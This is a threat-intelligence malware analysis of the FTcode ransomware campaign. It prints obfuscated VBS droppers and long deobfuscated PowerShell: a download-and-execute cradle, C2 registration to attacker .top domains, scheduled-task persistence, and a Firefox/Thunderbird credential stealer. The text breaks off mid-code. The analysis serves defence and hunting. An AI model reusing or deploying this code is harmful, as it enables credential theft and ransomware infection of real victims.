{
    "id": "aacfad21-a975-4f23-8f34-2a37569fe53c",
    "created_at": "2023-01-12T15:10:23.378794Z",
    "updated_at": "2025-03-27T02:15:38.158464Z",
    "deleted_at": null,
    "sha1_hash": "a35030565a2c24f90110923f116c0def4ead9f03",
    "title": "2020-06-22 - FTcode targets European countries",
    "authors": "",
    "file_creation_date": "2022-05-27T19:58:44Z",
    "file_modification_date": "2022-05-27T19:58:44Z",
    "file_size": 763547,
    "plain_text": "# CyberThreatIntel/Analysis.md at master · StrangerealIntel/CyberThreatIntel · GitHub\n\n**[github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional Analysis/Unknown/2020-06-22/Analysis.md](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-06-22/Analysis.md)**\n\nStrangerealIntel\n\n### Cannot retrieve contributors at this time\n\n## FTcode targets European countries\n\n Table of Contents\n\n### Malware analysis Cyber kill chain Indicators Of Compromise (IOC) References MITRE ATT&CK Matrix Links\n\n## Malware analysis\n\nThe initial vector used by the Threat Actor is a common phishing campaign which\ncontents, a malicious archive. This archive has a compressed composed of the vbs\nscript and lot empty slot of data for avoid the sandbox analysis (between 40MB to\n243MB)\n\n\n-----\n\nThis focus the companies and court with notification as theme of mail of phishing.\n\n[Here, some samples of mails used for the campaign and thanks to JAMESWT for](https://twitter.com/JAMESWT_MHT)\nsharing the pictures and information.\n\nTwo variants of the VBS script have been observed, one perform the register action\nas new client to infect with the ransomware. The second use in more stealer actions\nby NET class. Thanks to reecdeep for sharing some samples and information\n\nThe first variant use regular expression (regex) for parse each lines, the result is\nmerged for be the command to execute by shell call.\n\n\n-----\n\n```\nSet Regex New RegExp\nRegex.Pattern = \"(.+)O(.+)\"\nFunction Decode( input)\n Data = Data + Chr( ( Build( input, \"$2\")) - ( Build( input, \"$1\"))\n)\nEnd Function\nMod = 0\nData = \"\"\nDecode \"521O633\"\n'[...]\nDecode \"459O518\"\nCreateObject(\"WScript.Shell\").Run Data, Mod\nData = \"\"\nFunction Build(a, b)\n     Build = CInt( Regex.Replace(a, b))\nEnd Function\nMsgBox \"Bad archive\"\n\n```\nThe second VBS use too a regex for parse each line and select the data at each X\ndefined elements (here 7) and merge all for getting the command to execute. On\ncompared to the first VBS, we can note that the structure is the same with a different\nalgorithm.\n```\nDim Regex, Mod, Data\nSet Regex = New RegExp\nRegex.Pattern = \"(.{7})(.)\"\nRegex.Global = True\nMod = 0\nData = \"\"\nSub DecodeData\nDecode \"mp<}JMRpBUCwlcgoJLlckgzwD; [...] Sas{X-H.I{mObW\"\nDecode \"LfzDqZdi\"\n'[...]\nEnd Sub\nFunction build ( a )\n Data = Data & a\nEnd Function\nFunction Decode (input)\n build( Regex.Replace(input, \"$2\" ) )\nEnd Function\nDecodeData \nCreateObject(\"WScript.Shell\").Run Data, Mod ' run decoded command\nMod= \"iawzi\"\n'giovedi 8855 marzo\n\n```\nBy the retrohunt, the group seems increment its algorithm on the same template at\neach sending mass mails by batches of mails of theirs campaign, it can be interesting\nto use this reference for hunting.\n\n\n-----\n\nBoth have the same method for the next steps of the operations, this uses the\ndownloadString method for getting the bytes, convert from the base 64 and execute it\nin memory.\n```\npowershell uvywg=\"gzzhv\";\niex ( [string]\n[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64S\n ((New-Object\nNet.WebClient).DownloadString('hxxp://documento.selltokengarffhonda.c\nneed=dfgee52&vid=test1&99895')))));;;;;;\n\n```\nThe first part define the variables for the different paths, URL and payloads. Create\nthe following folder if don't exists.\n```\n$path_lib = $env:PUBLIC + \"\\Libraries\"\nif (-not (Test-Path $path_lib)) { md $path_lib; }\n$path_vbs = $path_lib + \"\\WindowsIndexingService.vbs\";\n$path_tmp = $env:temp + \"\\AFX50058.tmp\";\n$path_db = $path_lib + \"\\tsource.db\";\n$myurlpost = $false;\n$pay = \"w\";\n\n```\nThe following functions give the date for creating the timestamp used for stops the\ncurrent process. The second function stop the process if an exception is throwing on\nto collect process. The last function sends a call for register action as first and for\ngetting the ransomware on the second time.\n\n\n-----\n\n```\nfunction iamwork2() { sc Path $path_tmp Value $(Get Date); }\nfunction cleanup($input)\n{\n if($input -match 'OutOfMemoryException')\n {\n  ri - Path $path_tmp -Force; #ri -> Remove-Item\n  get-process powershell* | stop-process;\n  exit;\n };\n}\nfunction sendpost2($input)\n{\n if(!$myurlpost){ return $false; };\n $netclient = New-Object System.Net.WebClient;\n $netclient.Credentials =\n[System.Net.CredentialCache]::DefaultCredentials;\n $netclient.Headers.Add(\"Content-Type\", \"application/x-www-formurlencoded\");\n $netclient.Encoding = [System.Text.Encoding]::UTF8;\n try\n {\n  $rep = $netclient.UploadString($myurlpost,\"l=\"+\n[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((\"v=505.8&gu\n + $input))));\n  if(!$pay){ return $false; }\n  $refComp, $ParsedRep = $rep.split(\",\");\n  $ref =\n[Convert]::ToBase64String($cryptokey.ComputeHash([Text.Encoding]::ASC\n  if($ref -eq $refComp){ return ([string]\n[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64S\n }\n catch{ cleanup $_.Exception.Message; };\n return $false;\n};\n\n```\nThe next block of functionsare for the registration of the victims on the waiting list of\nthe attacker and for the timestramp used for automatically stop the process after 15\nminutes. The algorithm for generating the domains uses a list of string in base 64 and\nthe date. These domains seem more like a lure that a real domain.\n\n\n-----\n\n```\nfunction SendRegister($datatoc2)\n{\n $baseURL = \"http://z2uymda1mtk.top/\";\n \"ge\",\"6h\",\"sp\",\"FT\",\"4H\",\"fW\",\"mP\" | %{ $baseURL += \",\"+\"http://\"+\n([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_+\n$(Get-Date -UFormat \"%y%m%V\"))).toLower()) +\".top/\"; };\n #$baseurl ->\nhttp://z2uymda1mtk.top/,http://z2uymda2mju=.top/,http://nmgymda2mju=.\n $baseURL.split(\",\") | %{\n  if(!$myurlpost){\n   $myurlpost = $_ -replace \"=\", \"\";\n   #\n[\"http://z2uymda1mtk.top/\",\"http://z2uymda2mju.top/\",\"http://nmgymda2\n   if(!(sendpost2 ($datatoc2 + \"&domen=$myurlpost\"))){ $myurlpost\n= $false; };\n   Start-Sleep -s 5;\n  }\n };\n if($datatoc2 -match \"status=register\"){return \"ok\";}\n else{return $myurlpost;} \n};\n#Force remove item again\nif (Test-Path $path_tmp)\n{\n if (((NEW-TIMESPAN -Start ((Get-ChildItem $path_tmp).CreationTime)\n-End (Get-Date)).Minutes) -gt 15)\n {\n  ri -Path $path_tmp -Force;\n  try{ get-process powershell* | stop-process } catch{};\n  exit;\n }\n else{ exit; };\n};\n\n```\nThe last block of code creates a new GUID for the key of IV for the file encryption\nprocess with AES and sends the registration pulse to C2 domains. At each pulse\nafter the registration, if the response isn't changed by the attacker, this drops and\nexecutes the same initial VBS for reinfect the victim.\n\n\n-----\n\n```\nfunction GenerateRegister($input)\n{\n if($input)\n {\n  $rawGUID = [guid]::NewGuid();\n  $GUID = ([guid]::NewGuid() -replace '-','').Substring(0,16);\n  $cryptokey.key = [Text.Encoding]::ASCII.GetBytes($GUID); \n  $bannerData = \"status=register&ssid=$GUID&os=\"+\n([string]$PSVersionTable.BuildVersion)+\"&psver=\"+(((GetHost).Version).Major)+ \"&comp_name=\" + ((Get-WmiObject -class\nWin32_ComputerSystem -Property Name).Name.trim());\n  $ydtfbhdh = SendRegister $bannerData;\n  if($ydtfbhdh -ne \"ok\"){ exit; }\n  sc -Path $path_db -Value ($rawGUID, $GUID -join ',') -Force; \n  gi $path_db -Force | %{ $_.Attributes = \"Hidden\" };\n }\n return (get-content $path_db).split(',');\n}\n$cryptokey = New-Object System.Security.Cryptography.HMACSHA256;\n$task = (schtasks.exe /create /TN \"WindowsApplicationService\" /sc\nDAILY /st 00:00 /f /RI 14 /du 23:59 /TR $path_vbs); \n# Execute VBS file each 14 minutes and warning alerts are disable\nif (Test-Path $path_db) #Load if found\n{\n $rawGUID, $GUID = GenerateRegister $false;\n if($GUID.length -ne 16 ){ $rawGUID, $GUID = GenerateRegister\n$true; }\n}\nelse{ $rawGUID, $GUID = GenerateRegister $true;}\n$cryptokey.key = [Text.Encoding]::ASCII.GetBytes($GUID);\n$myurlpost = SendRegister;\nwhile($pay)\n{\n iamwork2;\n try\n {\n  if($pay -and ($pay.length -gt 30) ){ iex $pay;};\n }\n catch{ cleanup $_.Exception.Message; };\n Start-Sleep -s 280;\n $pay = sendpost2;\n};\nri -Path $path_tmp -Force;\n\n```\nA second variant of the code use an additional class in .NET for stealing the\ncredentials. The first block of code content the same structure with the variables and\nadd the create of the persistence method by task scheduled. The first new\nfunctionality is that sends return of operation to the C2 but only push success of fail\noperation, no one debug value are present for know the reason of the failure\noperation, that proves that the TA is more interested by the return of the successful\nstolen data. Whether as attacker that you are in a red team or a well organized\ncybercriminal group, having debug informations is important for know the reasons or\nand idea of problems (action blocked by AMSI, AV, invalid rights, unknown error with\na specific build OS ...) and keep a fix or an alternative method for bypass the\nproblem This already gives the idea that the TA is only motived for the instant gain\n\n\n-----\n\nnot as resell interesting infrastructures before ransom it (TA505 to silence by\nexamples), for a botnet or intermediate C2 platform structure.\n```\ntry\n{\n $path_lib = $env:PUBLIC + \"\\Libraries\"\n if (-not (Test-Path $path_lib)) { md $path_lib; }\n $path_vbs = $path_lib + \"\\WindowsIndexingService.vbs\";\n $netclient = New-Object System.Net.WebClient;\n $netclient.Credentials =\n[System.Net.CredentialCache]::DefaultCredentials; \n $netclient.DownloadString(\"http://z2uymda1mtk.top/?need=ma7dd05&\")\n| out-file $path_vbs;\n schtasks.exe /create /TN \"WindowsApplicationService\" /sc DAILY /st\n00:00 /f /RI 16 /du 23:59 /TR $path_vbs; # Create service\nWindowsApplicationService -> Keep persistence\n}\ncatch{}\nfunction SendStringToC2( $DatatoSend )\n{\n $netclient = New-Object System.Net.WebClient;\n $netclient.Credentials =\n[System.Net.CredentialCache]::DefaultCredentials;\n $netclient.Headers.Add(\"Content-Type\", \"application/x-www-formurlencoded\");\n $netclient.Encoding = [System.Text.Encoding]::UTF8;\n try\n {\n  $RepCode = $netclient.UploadString( \"http://z2uymda1mtk.top/\",\n\"guid=temp_9192217407&\" + $DatatoSend );\n  return $RepCode;\n }\n catch{};\n return $false;\n};\n\n```\nThis next function is used for recognized the format of the payload send by the C2 by\nmagic numbers, if this a PE, a COM executable or a encrypt payload (by unknown\nflag). This section is correctly coded and are very different of the rest of the code,\nseems to be a copy/paste or another person of the group have coded this part.\n\n\n-----\n\n```\nfunction Get ExecutableType\n{\n [CmdletBinding()]\n param (\n   [Parameter(Mandatory = $true)]\n   [ValidateScript({ Test-Path -LiteralPath $_ -PathType Leaf })]\n   [string]\n   $Path\n )\n try\n {\n    try\n    {\n      $stream = New-Object System.IO.FileStream(\n        $PSCmdlet.GetUnresolvedProviderPathFromPSPath($Path),\n        [System.IO.FileMode]::Open,\n        [System.IO.FileAccess]::Read,\n        [System.IO.FileShare]::Read\n      )\n    }\n    catch\n    {\n    SendStringToC2 \"crederror=ERR:Error opening file $Path for\nRead: $($_.Exception.Message)\";\n    throw\n    }\n    $exeType = 'Unknown'\n    if ([System.IO.Path]::GetExtension($Path) -eq '.COM'){\n$exeType = '16-bit'} #COM Object\n    $bytes = New-Object byte[](4) # Header of payload -> check\nMagic numbers\n    if ( ($stream.Length -ge 64) -and ($stream.Read($bytes, 0, 2)\n-eq 2) -and ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) ) #Check\ncorrect reading of the stream and checlk PE magic numbers \n    {\n      $exeType = 16 \n      if ( ($stream.Seek(0x3C, [System.IO.SeekOrigin]::Begin) eq 0x3C) -and ($stream.Read($bytes, 0, 4) -eq 4) ) # Check init\ncursor + read the data works\n      {\n        if (-not [System.BitConverter]::IsLittleEndian) {\n[Array]::Reverse($bytes, 0, 4) } #Check little Endian else reverse\nthe bits to Big Endian\n        $peHeaderOffset =\n[System.BitConverter]::ToUInt32($bytes, 0) # Get Offset\n        if ($stream.Length -ge $peHeaderOffset + 6 -and\n          $stream.Seek($peHeaderOffset,\n[System.IO.SeekOrigin]::Begin) -eq $peHeaderOffset -and\n          $stream.Read($bytes, 0, 4) -eq 4 -and\n          $bytes[0] -eq 0x50 -and $bytes[1] -eq 0x45 -and\n$bytes[2] -eq 0 -and $bytes[3] -eq 0) #Crypted payload option\n        {\n          $exeType = 'Unknown'\n          if ($stream.Read($bytes, 0, 2) -eq 2)\n          {\n\n```\n\n-----\n\n```\n            if ( not\n[System.BitConverter]::IsLittleEndian) { [Array]::Reverse($bytes, 0,\n2) } #Check little Endian else reverse the bits to Big Endian\n            $machineType =\n[System.BitConverter]::ToUInt16($bytes, 0) \n            switch ($machineType) #check Arch system\n            {\n              0x014C { $exeType = 32 }\n              0x0200 { $exeType = 64 }\n              0x8664 { $exeType = 64 }\n            }\n          }\n        }\n      }\n    }\n    return $exeType\n }\n catch {throw} #Push exception \n finally { if ($null -ne $stream) { $stream.Dispose() } } #Free\nunmanaged resources\n}\n\n```\nHere, we can see the begin a .NET class that can be invoked, create the log on the\nTemp folder and declare the function for merge all the data of an array of data stolen\nby a method executed (for mozilla, chrome software...)\n```\n$stillerBlock = {\n$ErrorActionPreference = \"SilentlyContinue\"\n$global:log = [System.IO.Path]::GetTempFileName() #Path of the log\ntry{ Start-Transcript -Append $global:log; }\ncatch{}\nfunction mergeInfo($data, $info)\n{\n try\n {\n  foreach($record in $data.info.Keys) \n  {\n   if($info.info[$record.ToString()] -eq $null) {\n$info.info[$record] = @() }\n   foreach($value in $data.info[$record]) { $info.info[$record]\n+= @{ [string]$value.Keys = [string]$value.Values } }  \n  }\n }\n catch{ SendStringToC2 \"crederror=ERR:mergeInfo:\n$($_.Exception.Message)\"; }\n}\n\n```\nThe next function is used for the dump of the credentials of Mozilla Software (Firefox\nand Thunderbird). This check in testing the validity of the paths (32 and 64 bytes)\nwith the recovery dll (that used later for extraction of data), at the first valid path is\ncopy it and stop the loop. This returns an default error if nothing found. This logic is\nstupid this only detect the presence of Mozilla software but don't give valuable\ninformations like the valide paths for listing as first and avoid to make a second time\nthe tries on the system (be more stealth) and for the debug, imagine that tomorrow\n\n\n-----\n\nMozilla change the format of the data, you can know that you have found valid files\nbut your method don't works for any reason.\n```\nFunction ff_dump\n{\n  try\n  {\n    $ffInfo = @{}\n    $ffError = \"SUCCESS\"\n    $mPaths = @(\"$env:SystemDrive\\Program Files\\Mozilla Firefox\",\n\"$env:SystemDrive\\Program Files\\Mozilla Thunderbird\",\n\"$env:SystemDrive\\Program Files (x86)\\Mozilla Firefox\",\n\"$env:SystemDrive\\Program Files (x86)\\Mozilla Thunderbird\")  \n    $mozillaPath = $null\n    foreach($path in $mPaths) \n    {\n      $nssPath = $(Join-Path ([string]$path)\n([string]'nss3.dll'))\n        if([System.IO.File]::Exists($nssPath)) \n        {\n          $mozillaPath = ([string]$path)\n          break # if one of path is true, break the loop\nand add the path\n        }\n    }\n    #if nothing found return the error\n    if($mozillaPath -eq $null) { return @{\"logs\" =\n\"$global:log\"; \"error\" = $ffError; \"info\" = $ffInfo} }\n\n```\nOnce that this checked, this try to check if the Web extensions that the old .NET\nframeworks disable by default. This is used for the script, for the final request. This\nimport after the class which use the dll in the two structures.\n\n\n-----\n\n```\n    try { Add Type AssemblyName System.web.extensions } #\nSystem.Web.Extensions contains all the classes and support classes\nfor ASP.NET AJAX controls (JSON)\n    catch { return @{\"logs\" = \"$global:log\"; \"error\" = \"Load WEB\nassembly\"; \"info\" = $ffInfo} }\n    $netStructs = @\"\n      public struct TSECItem2 \n      {\n        public int SECItemType;\n        public int SECItemData;\n        public int SECItemLen;\n      }\n      public struct SlotInfo {}\n\"@ \n    $cp = New-Object System.CodeDom.Compiler.CompilerParameters\n    $cp.CompilerOptions = '/unsafe'\n    Add-Type -TypeDefinition $netStructs -Language CSharp CompilerParameters $cp #initiate NET structure\n    $netCode = @\"\n      using System;\n      using System.Diagnostics;\n      using System.Runtime.InteropServices;\n      using System.Text;\n        public static class nss3\n        {\n          [DllImport(\"nss3.dll\", EntryPoint =\n\"PL_Base64Decode\", CallingConvention = CallingConvention.StdCall, \nCharSet = CharSet.Auto)]\n            public static extern IntPtr\nPL_Base64Decode(IntPtr inStr, int inLen, IntPtr outStr);\n          [DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\n            public static extern IntPtr\nPK11_GetInternalKeySlot();\n          [DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\n            public static extern void\nPK11_FreeSlot(IntPtr SlotInfoPtr);\n          [DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\n            public static extern int\nPK11_CheckUserPassword(IntPtr slotInfo, string pwd);\n          [DllImport(\"nss3.dll\", EntryPoint =\n\"PK11SDR_Decrypt\", CallingConvention = CallingConvention.Cdecl, \nCharSet = CharSet.Ansi)]\n            public static extern int \nPK11SDR_Decrypt(IntPtr dataIn, IntPtr dataOut, string pVoid);\n          [DllImport(\"nss3.dll\", EntryPoint =\n\"SECITEM_ZfreeItem\", CallingConvention = CallingConvention.Cdecl, \nCharSet = CharSet.Ansi)]\n            public static extern void \nSECITEM_ZfreeItem(IntPtr secItem, int count);\n\n```\n\n-----\n\n```\n          [DllImport(\"nss3.dll\", EntryPoint =\n\"NSSUTIL_GetVersion\", CallingConvention = CallingConvention.StdCall, \nCharSet = CharSet.Auto)]\n            public static extern IntPtr\nNSSUTIL_GetVersion();\n          [DllImport(\"nss3.dll\", EntryPoint =\n\"NSS_IsInitialized\", CallingConvention = CallingConvention.StdCall, \nCharSet = CharSet.Auto)]\n            public static extern bool\nNSS_IsInitialized();\n          [DllImport(\"nss3.dll\", EntryPoint = \"NSS_Init\",\nCallingConvention = CallingConvention.StdCall, CharSet =\nCharSet.Auto)]\n            public static extern int NSS_Init(byte[]\npath); \n          [DllImport(\"nss3.dll\", EntryPoint =\n\"NSS_Shutdown\", CallingConvention = CallingConvention.StdCall, \nCharSet = CharSet.Auto)]\n            public static extern int NSS_Shutdown();\n          [DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\n            public static extern int PORT_GetError();\n          [DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\n            public static extern IntPtr\nPR_ErrorToName(int err);\n        }\n        internal static class UnsafeNativeMethods\n        {\n          [DllImport(\"kernel32.dll\", CharSet =\nCharSet.Auto, SetLastError = true)]\n            internal static extern IntPtr\nLoadLibrary(string lpFileName);\n          [DllImport(\"kernel32.dll\", CharSet =\nCharSet.Auto, SetLastError = true)]\n            internal static extern bool\nFreeLibrary(IntPtr hModule);\n          [DllImport(\"kernel32.dll\", CharSet =\nCharSet.Auto, SetLastError = true)]\n            internal static extern bool\nSetDllDirectoryW(string lpPathName);\n          [DllImport(\"kernel32.dll\", CharSet =\nCharSet.Auto, CallingConvention = CallingConvention.StdCall,\nSetLastError = true)]\n            internal static extern IntPtr\nGetProcAddress(IntPtr hModule, string procName);\n        }\n\n```\n\n-----\n\n```\n        public static class Stiller # You want say \"Stealer\"\n? lol \n        {\n          static IntPtr pk11slot = IntPtr.Zero;\n          static IntPtr vcruntime140dll = IntPtr.Zero;\n          static IntPtr msvcp140dll = IntPtr.Zero;\n          static IntPtr mozgluedll = IntPtr.Zero;\n          static IntPtr nss3dll = IntPtr.Zero;\n          public static void loadHelpers(string ffPath) \n          {\n            Stiller.vcruntime140dll =\nUnsafeNativeMethods.LoadLibrary(ffPath + \"\\\\vcruntime140.dll\");\n            Stiller.msvcp140dll =\nUnsafeNativeMethods.LoadLibrary(ffPath + \"\\\\msvcp140.dll\");\n            Stiller.mozgluedll =\nUnsafeNativeMethods.LoadLibrary(ffPath + \"\\\\mozglue.dll\"); \n          }\n          public static IntPtr loadNSS3(string ffPath)\n          {\n            IntPtr nss3 =\nUnsafeNativeMethods.LoadLibrary(ffPath + \"\\\\nss3.dll\"); \n            Stiller.nss3dll = nss3;\n            return nss3;  \n          }\n          public static bool initFF(string ffPath, string\nprofilePath)\n          {\n            bool result = false;\n            loadHelpers(ffPath);\n              if(loadNSS3(ffPath) != IntPtr.Zero)\n              {\n                IntPtr nV =\nnss3.NSSUTIL_GetVersion();\n                int nssInitRez =\nnss3.NSS_Init(Encoding.ASCII.GetBytes(profilePath));\n                if(nssInitRez == 0)\n                {\n                  pk11slot =\nnss3.PK11_GetInternalKeySlot();\n                  int checkPwd =\nnss3.PK11_CheckUserPassword(pk11slot, \"\");\n                  if(checkPwd == 0) { result =\ntrue; }\n                }\n              }\n            return result;\n          }\n          public static void shutdownFF()\n          {\n            nss3.PK11_FreeSlot(pk11slot);\n\n```\n\n-----\n\n```\n            int rez nss3.NSS_Shutdown();\n            UnsafeNativeMethods.FreeLibrary(nss3dll); \nUnsafeNativeMethods.FreeLibrary(Stiller.mozgluedll); \nUnsafeNativeMethods.FreeLibrary(Stiller.msvcp140dll);\nUnsafeNativeMethods.FreeLibrary(Stiller.vcruntime140dll);\n          }\n          public struct TSECItemType \n          {\n            public int SECItemType;\n            public IntPtr SECItemData;\n            public int SECItemLen;\n          }\n          public struct SlotInfo { public long l;} \n          public static string decodeData(string\nprofilePath, string dataEnc, byte[] unBase64)\n          {\n            string decoded = \"\";\n              try\n              {\n                bool nssIsInit =\nnss3.NSS_IsInitialized();\n                if(!nssIsInit) { return \"\"; }\n                int TSECItemTypeSize =\nMarshal.SizeOf(typeof(TSECItemType));\n                TSECItemType dataIn = new\nTSECItemType(); \n                dataIn.SECItemData =\nMarshal.AllocHGlobal(unBase64.Length);\n                Marshal.Copy(unBase64, 0,\ndataIn.SECItemData, unBase64.Length);\n                dataIn.SECItemLen= unBase64.Length;\n                dataIn.SECItemType= 0;\n                IntPtr dataOutPtr =\nMarshal.AllocHGlobal(TSECItemTypeSize);\n                IntPtr dataInPtr =\nMarshal.AllocHGlobal(TSECItemTypeSize);\n                Marshal.StructureToPtr(dataIn,\ndataInPtr, true);\n                int decryptRez =\nnss3.PK11SDR_Decrypt(dataInPtr, dataOutPtr, null);\n                if(decryptRez != 0) { return \"\"; }\n                TSECItemType dataOut =\n(Stiller.TSECItemType)Marshal.PtrToStructure(dataOutPtr,\ntypeof(TSECItemType)); //\n                decoded =\nPtrToStringSized(dataOut.SECItemData, dataOut.SECItemLen);\n                nss3.SECITEM_ZfreeItem(dataOutPtr,\n0);\n                Marshal.FreeHGlobal(dataInPtr);\n              }\n\n```\n\n-----\n\n```\n              catch { return ;} \n              return decoded;\n          }\n          private static string PtrToStringUtf8(IntPtr ptr)\n          {\n            if (ptr == IntPtr.Zero) {return \"\";}\n            int len = 0;\n            while\n(System.Runtime.InteropServices.Marshal.ReadByte(ptr, len) != 0)\n{len++;}\n            if (len == 0){return \"\";}\n            byte[] array = new byte[len];\nSystem.Runtime.InteropServices.Marshal.Copy(ptr, array, 0, len);\n            return\nSystem.Text.Encoding.UTF8.GetString(array);\n          } \n          private static string PtrToStringSized(IntPtr\nptr, int len) \n          {\n            if (ptr == IntPtr.Zero){return \"\";} \n            if (len == 0){return \"\";}\n            byte[] array = new byte[len];\nSystem.Runtime.InteropServices.Marshal.Copy(ptr, array, 0, len);\n            return\nSystem.Text.Encoding.UTF8.GetString(array);\n          } \n        }\n\"@\n\n```\nThis initiates the .NET class and define the path of the profile, the fact to use an array\nwith valid softwares by the valid paths will be more stealth, this retry for each arch\nversion and software. This search to steal the SMTP credentials.\n\n\n-----\n\n```\n    Add Type TypeDefinition $netCode Language CSharp\nCompilerParameters $cp2 # Initiate .NET payload\n    $profilePathFF =\n\"$($env:APPDATA)\\Mozilla\\Firefox\\Profiles\\*.*\"\n    $profilePathTB = \"$($env:APPDATA)\\ThunderBird\\Profiles\\*.*\"\n    $defaultProfiles = @()\n    try \n    {\n      $defaultProfiles += $(Get-ChildItem $profilePathFF ErrorAction SilentlyContinue) | select -ExpandProperty FullName ErrorAction SilentlyContinue\n      $defaultProfiles += $(Get-ChildItem $profilePathTB ErrorAction SilentlyContinue) | select -ExpandProperty FullName ErrorAction SilentlyContinue\n    }\n    catch {}\n    # Why don't do an array with the valid path ?\n    # Test again\n    if($mozillaPath -ne $null) \n    {\n      $nss = $(Join-Path ([string]$mozillaPath)\n([string]'nss3.dll')) \n      If([System.IO.File]::Exists($nss)) #if the dll exists\n      {\n        foreach($defaultProfile in $defaultProfiles)\n        {     \n          if($defaultProfile -ne $null ) \n          {\n            $jsonPath = $(Join-Path\n([string]$defaultProfile) ([string]\"logins.json\"))\n            if([System.IO.File]::Exists($jsonPath)) \n            {\n              $jsonFile = (Get-Content $jsonPath ErrorAction SilentlyContinue)\n                if(!($jsonFile)){}\n                else\n                { \n                  $ser = New-Object\nSystem.Web.Script.Serialization.JavaScriptSerializer\n                  $obj =\n$ser.DeserializeObject($jsonFile)\n                  $initFF =\n$([Stiller]::initFF($mozillapath, $defaultProfile));\n                  if($initFF -eq $True) \n                  {  \n                    $logins = $obj['logins']\n                    $count = ($logins.Count) - 1\n                    for($i = 0; $i -le $count;\n$i++)\n                    {\n                      $formUrl =\n$logins.GetValue($i)['formSubmitURL']\n                      if($formUrl -eq $null) \n                      {\n                        $formUrl =\n\n```\n\n-----\n\n```\n$logins.GetValue($i)[ hostname ]\n                        if($formUrl -eq\n$null) { $formUrl = \"empty\" }\n                      }\n                      #Get informations of the\nprofile\nif(($formUrl.StartsWith(\"smtp\",\"CurrentCultureIgnoreCase\")) -Or\n($formUrl.StartsWith(\"pop\",\"CurrentCultureIgnoreCase\")) -Or\n($formUrl.StartsWith(\"imap\",\"CurrentCultureIgnoreCase\"))) { $url =\n([System.Uri]$formUrl).Host}\n                      else\n                      {\n                        $url =\n([System.Uri]$formUrl).Host\n                        if($url.Length -eq 0)\n{ $url = \"empty\" }\n                      }  \n                      $encPwd =\n$logins.GetValue($i)['encryptedPassword']\n                      $encUser =\n$logins.GetValue($i)['encryptedUsername']\n                      if($encPwd.Length -gt 0 and $encUser.Length -gt 0) \n                      {\n                        $pass =\n[Stiller]::decodeData($defaultProfile, $encPwd,\n[System.Convert]::FromBase64String($encPwd))\n                        $user =\n[Stiller]::decodeData($defaultProfile, $encUser,\n[System.Convert]::FromBase64String($encUser))\n                        if($ffInfo[$url] -eq\n$null) { $ffInfo[$url] = @() }\n                        $ffInfo[$url] += @{\n[string]$user = [string]$pass }\n                      }\n                    }\n                    [Stiller]::shutdownFF()\n                  }\n                }\n            }\n            else{ $ffError = \"NO PROFILE\"; }\n          }\n        }\n      }\n      else{ $ffError = \"NO ff\\TB\"; }\n    }\n    return @{\"logs\" = \"$global:log\"; \"error\" = $ffError; \"info\" =\n$ffInfo}\n  }\n  catch{ SendStringToC2 \"crederror=ERR:ff_dump:\n$($_.Exception.Message)\";}\n}\n\n```\n\n-----\n\nThe next functions are used for decode the value of each character by mathematical\noperations (power of 2, XOR, floor the resulting value).\n```\nFunction __ToInt($ByteArray)\n{  \n try\n { \n  If ($ByteArray.Length -eq 0) { Return 0 } # No data exception\n  [int32] $i = 0;\n  $x = 0;\n  Do { $i = [math]::Floor($i * [math]::Pow(2, 0x8)) -bor\n($ByteArray[$x++]) } # Pow 2,8 -> 2^8 -> 256 + Xor by value of the\nArray\n  While ($x -lt $ByteArray.Length) # Parse all the array\n  Return $i; # Return final interger\n }\n catch{ SendStringToC2 \"crederror=ERR:__ToInt:\n$($_.Exception.Message)\"; }\n}\nFunction ParseVarint($ByteArray, [ref]$VarintSize)\n{\n try\n { \n  [int32] $Val = 0;\n  $x = 0;\n  Do \n  {\n   $Byte = $ByteArray[$x++];\n   $Val = [math]::Floor($Val * [math]::Pow(2, 0x7)) -bor ($Byte band 0x7F); # Decode the bytes of the array\n  }\n  While($x -lt 8 -and ($Byte -band 0x80))\n  $VarintSize.Value = $x;\n  Return $Val; #Get final value\n }\n catch{ SendStringToC2 \"crederror=ERR:ParseVarint:\n$($_.Exception.Message)\"; } \n}\n[ref]$VarintSize = 0;\n\n```\nThe next three functions check the correct extension (magic numbers of sqlite data)\nand define the cells of data. Each cell which contents the data is parsed and\nanalyzed if this a username, URL, password to decode and add to list of dump data\nfor firefox.\n\n\n-----\n\n```\nFunction ParseSQLite($Page)\n{\n try\n {\n  If ($Page[0] -ne 0x0D) { Return } #Wrong Magic Index\n  $NumCells = __ToInt $Page[0x3..0x4]; # Check number of cells of\ndata\n  $CellAddrStart = 0x8; #Begin interval\n  $CellAddrStop = $CellAddrStart + ($NumCells * 2) - 1; #End\ninterval\n  For ($x = $CellAddrStart; $x -le $CellAddrStop; $x += 2) #Parse\nall the cells\n  {\n    $CellAddr = __ToInt ($Page[$x .. ($x + 1)]); #Push the\naddress to point\n    ParseCellSQLite($Page[$CellAddr .. $Page.Length]); # Send the\ncell to decrypt\n  }\n }\n catch{ SendStringToC2 \"crederror=ERR:ParseSQLite:\n$($_.Exception.Message)\"; } \n}\nFunction ParseCellSQLite($Cell)\n{  \n try\n {\n  $Offset = 0\n  $PayloadLength = ParseVarint ($Cell[$Offset .. ($Offset + 4)])\n$VarintSize\n  $Offset += $VarintSize.Value\n  $RowID = ParseVarint ($Cell[$Offset .. ($Offset + 4)])\n$VarintSize \n  $Offset += $VarintSize.Value \n  If (($Offset + $Payload.Length) -le $Cell.Length){\nParsePayloadSQLite $Cell[$Offset .. ($Offset + $PayloadLength - 1)] }\n# Return the cell to decode with the dll\n }\n catch{ SendStringToC2 \"crederror=ERR:ParseCellSQLite:\n$($_.Exception.Message)\";} \n}\nFunction ParsePayloadSQLite($Payload)\n{\n try\n {\n  If ($Payload.Length -eq 0) { Return }\n  [ref]$VarintSize = 0;\n  $HeaderLength = ParseVarint $Payload[0 .. 8] $VarintSize \n  $Offset = $VarintSize.Value;\n  $FieldSeq = @()\n  For ($y = 